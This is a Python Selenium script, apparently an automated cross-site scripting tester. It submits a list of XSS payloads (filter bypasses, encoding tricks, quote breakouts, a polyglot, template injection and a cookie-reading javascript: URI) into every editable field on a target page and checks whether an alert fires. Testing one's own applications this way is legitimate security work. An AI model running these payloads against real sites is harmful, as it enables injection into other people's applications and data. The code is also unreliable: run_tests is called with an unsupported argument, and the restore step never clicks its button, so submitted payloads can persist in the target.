from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoAlertPresentException, UnexpectedAlertPresentException
import time

Edit_Trigger_Selectors = [
    ".badge-edit",
    "[class*='edit']",
    "[title*='تعديل']",
    "[title*='إضافة']",
    "button.btn-primary",
    "button.bg-primary",
    "[type*='button']",
    "[type*='submit']",
]

def find_visible_text_input(driver):
    candidates = driver.find_elements(
        By.CSS_SELECTOR,
        "input[type='text'], input:not([type]), textarea"
    )
    for el in candidates:
        try:
            if el.is_displayed() and el.is_enabled():
                return el
        except Exception:
            continue
    return None

def click_until_input_appears(driver, max_clicks=5, wait=0.8):
    for attempt in range(max_clicks):
        field = find_visible_text_input(driver)
        if field:
            return True
        clicked = False
        for selector in Edit_Trigger_Selectors:
            triggers = driver.find_elements(By.CSS_SELECTOR, selector)
            for trigger in triggers:
                try:
                    if trigger.is_displayed() and trigger.is_enabled():
                        trigger.click()
                        time.sleep(wait)
                        clicked = True
                        break
                except Exception:
                    continue
            if clicked:
                break
        if not clicked:
            break
    field = find_visible_text_input(driver)
    return field is not None

payloads = [
     # --- Basic execution ---
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.origin)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",

    # --- Event-handler based (work when <script> is stripped/inert) ---
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<iframe onload=alert(1)>",

    # --- Attribute / quote breakout (for when payload lands inside an attribute) ---
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",

    # --- javascript: URI (for href/src-type sinks) ---
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",

    # --- Case / obfuscation bypass (for naive filters) ---
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<img src=x OnErRoR=alert(1)>",
    "<img src=x onerror=\u0061lert(1)>",

    # --- Without parentheses / without spaces (bypasses naive blacklist filters) ---
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert`1`>",
    "<img/src=x/onerror=alert(1)>",
    "<svg%0Aonload=alert(1)>",
    "<img src=x onerror=\talert(1)>",

    # --- Encoding tricks ---
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<img src=x onerror=&#97;lert(1)>",
    "<script>\\u0061lert(1)</script>",

    # --- Broken/partial tag tricks (bypass regex-based filters expecting full tags) ---
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<img src=`x`onerror=alert(1)>",

    # --- No-alert, visible/detectable side effects (good when alert() is blocked by CSP but injection still works) ---
    "<script>document.title='XSS-POC'</script>",
    "<script>document.body.style.background='red'</script>",
    "<plaintext>",
    "<script>document.write('XSS-POC')</script>",
    "<script>document.getElementById('xsspoc')?.remove()</script>",

    # --- Polyglot (tries to work across multiple contexts at once) ---
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
    "\"><svg onload=alert(String.fromCharCode(88,83,83))>",

    # --- DOM clobbering / template-injection style (useful against React/Vue/Angular sinks) ---
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<img src=x:alert(alt) onerror=eval(src) alt=1>",
]


def get_testable_fields(driver):
    inputs = driver.find_elements(By.TAG_NAME, "input")
    textarea = driver.find_elements(By.TAG_NAME, "textarea")
    all_fields = inputs + textarea
    testable_inputs = []
    for field in all_fields:
        try:
            field_type = field.get_attribute("type") or "text"
            is_disabled_flag = field.is_displayed()
            is_enabled_flag = field.is_enabled()
            if field_type.lower() in ("hidden", "button", "checkbox", "radio", "file", "image", "reset", "submit"):
                continue
            if not is_disabled_flag or not is_enabled_flag:
                continue
            testable_inputs.append(field)
        except Exception:
            continue
    return testable_inputs

def get_submittable_buttons(driver):
    all_buttons = driver.find_elements(By.TAG_NAME, "button")
    # change it to be more broader for another websites
    submittable_button = []
    for button in all_buttons:
        text = button.text.strip()
        if text == "تحديث":
          submittable_button.append(button)
        elif text == "حفظ":
            submittable_button.append(button)
    return submittable_button
    

def get_field_locator(field, index):
    field_id = field.get_attribute("id")
    field_name = field.get_attribute("name")
    if field_id:
        return (By.ID, field_id)
    elif field_name:
        return (By.NAME, field_name)
    else:
        return (By.XPATH, f"(//input | //textarea)[{index + 1}]")

def test_all_edit_triggers(driver, url, payload, wait=0.5):
    driver.get(url)
    time.sleep(wait)

    all_results = []

    #find every edit trigger on the page
    edit_triggers = []
    for selector in Edit_Trigger_Selectors:
        found = driver.find_elements(By.CSS_SELECTOR, selector)
        for t in found:
            try:
                if t.is_displayed() and t.is_enabled():
                    edit_triggers.append(selector)
            except Exception:
                continue
    if not edit_triggers:
        edit_triggers = [None]

    for trigger_index, selector in enumerate(edit_triggers):
        driver.get(url)
        time.sleep(wait)

        try:
            if selector is not None:
                triggers = driver.find_elements(By.CSS_SELECTOR, selector)
                visible_triggers = [t for t in triggers if t.is_displayed() and t.is_enabled()]
                if trigger_index < len(visible_triggers):
                    visible_triggers[trigger_index].click()
                    time.sleep(wait)
                else:
                    continue

            fields = get_testable_fields(driver)
            if not fields:
                continue

            locators = [get_field_locator(f, i) for i, f in enumerate(fields)]

            for idx, (by, value) in enumerate(locators):
                try:
                    field = driver.find_element(by, value)
                    original_value = field.get_attribute("value") or ""
                    field.clear()
                    field.send_keys(payload)

                    buttons = get_submittable_buttons(driver)
                    if buttons:
                        buttons[0].click()
                    time.sleep(wait)

                    executed = False
                    try:
                        alert = driver.switch_to.alert
                        alert.accept()
                        executed = True
                    except (NoAlertPresentException, UnexpectedAlertPresentException):
                        pass

                    # restore
                    driver.get(url)
                    time.sleep(wait)
                    if selector is not None:
                        triggers = driver.find_elements(By.CSS_SELECTOR, selector)
                        visible = [t for t in triggers if t.is_displayed() and t.is_enabled()]
                        if trigger_index < len(visible):
                            visible[trigger_index].click()
                            time.sleep(wait)
                    field = driver.find_element(by, value)
                    field.clear()
                    field.send_keys(original_value)
                    restore_buttons = get_submittable_buttons(driver)
                    if restore_buttons:
                        restore_buttons[0].click
                    time.sleep(wait)

                    all_results.append({
                        "trigger": f"trigger #{trigger_index} ({selector})",
                        "field" : f"{by}={value}",
                        "executed": executed
                    })
                except Exception as e:
                    all_results.append({
                        "trigger": f"trigger #{trigger_index} ({selector})",
                        "field": f"{by}={value}",
                        "error": str(e)
                    })
        except Exception as e:
            all_results.append({
                "trigger": f"trigger #{trigger_index} ({selector})",
                "field": "unknown",
                "error": str(e)
            })
    return all_results

# def test_all_fields(driver, url, payload, wait=0.5):
#     driver.get(url)
#     time.sleep(wait)
#     click_until_input_appears(driver, wait=wait)
#     fields = get_testable_fields(driver)
#     locators = [get_field_locator(f, i) for i, f in enumerate(fields)]
#     results = []

#     for idx, (by, value) in enumerate(locators):
#         driver.get(url)
#         time.sleep(wait)
#         click_until_input_appears(driver, wait=wait)

#         try:
#             field= driver.find_element(by, value)
#             original_value = field.get_attribute("value") or ""
#             field.clear()
#             field.send_keys(payload)

#             buttons = get_submittable_buttons(driver);
#             if buttons:
#                 buttons[0].click()
#             time.sleep(wait)

#             executed = False
#             try:
#                 alert = driver.switch_to.alert
#                 alert.accept()
#                 executed = True
#             except (NoAlertPresentException, UnexpectedAlertPresentException):
#                 pass

#             # restore the original value
#             driver.get(url)
#             time.sleep(wait)
#             click_until_input_appears(driver, wait=wait)
#             field = driver.find_element(by, value)
#             field.clear();
#             field.send_keys(original_value)
#             restore_buttons = get_submittable_buttons(driver)
#             if restore_buttons:
#                 restore_buttons[0].click()
#             time.sleep(wait)

#             results.append({
#                 "field": f"{by} = {value}",
#                 "executed": executed
#             })
#         except Exception as e:
#             results.append({
#                 "field": f"{by} = {value}",
#                 "error": str(e)
#             })
#     return results
            
    
#     #field.clear()
#     #field.send_keys(payload)
    
#     # button.click()
#     # time.sleep(wait)

#     # executed = False

#     # try:
#     #     alert = driver.switch_to.alert
#     #     alert.accept()
#     #     executed = True
#     # except (NoAlertPresentException, UnexpectedAlertPresentException):
#     #    pass

#     # driver.get(url)
#     # time.sleep(wait)
#     # field = driver.find_element(By.ID, input_id)
#     # field.clear()
#     # field.send_keys(original_value)
#     # driver.find_element(By.CSS_SELECTOR, button_selector).click()
#     # time.sleep(wait)
#     # return executed

def run_tests(url, headless=False):
    options = webdriver.ChromeOptions()
    if headless:
        options.add_argument("--headless=new")  
    driver = webdriver.Chrome(options=options)

    # driver.get(url)
    # time.sleep(0.5)
    # field = driver.find_element(By.ID, input_id)
    # original_value = field.get_attribute("value")
    # print(f"Saved original value: {original_value!r}")


    all_results = []
    for payload in payloads:
        print(f"\n--- Testing Payload: {payload[:60]} ---")
        field_results = test_all_edit_triggers(driver, url, payload, wait=0.5)
        for r in field_results:
            status = "Executed" if r.get("executed") else ("error" if "error" in r else "no alert")
            print(f"  [trigger: {r.get('trigger')}] [field: {r['field']}] {status}")
        all_results.append((payload, field_results))
          
    driver.quit()
    return all_results
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test XSS payloads against an input fields")
    parser.add_argument("--url", "-u", required=True, help="Target page URL")
    # refactor it so it can take all the inputs in the page, and if -i provided it could test it just on the desired input field
    # parser.add_argument("--input-id", "-i", required=True, help="HTML id of the input field (no #) you want to inject the payload in it")
    parser.add_argument("-H", "--headless", action="store_true", help="Run Chrome in headless mode")
    parser.add_argument("-w", "--wait", type=float, default=0.5, help="Seconds to wait after actions")
    # add the wait seconds later, and if you want it headless or no
    args = parser.parse_args()

    run_tests(args.url, headless=args.headless, wait=args.wait)


    # make the payload can be chosen from a word list or external file
    # Reference lists worth pulling more from (all public, maintained, categorized by context): PortSwigger’s XSS cheat sheet,
    #  and PayloadsAllTheThings’ XSS Injection folder on GitHub — both are the standard references pentesters use 
    # and go well beyond this list into WAF-specific bypasses (Cloudflare, Akamai, etc.) if you end up needing those.
    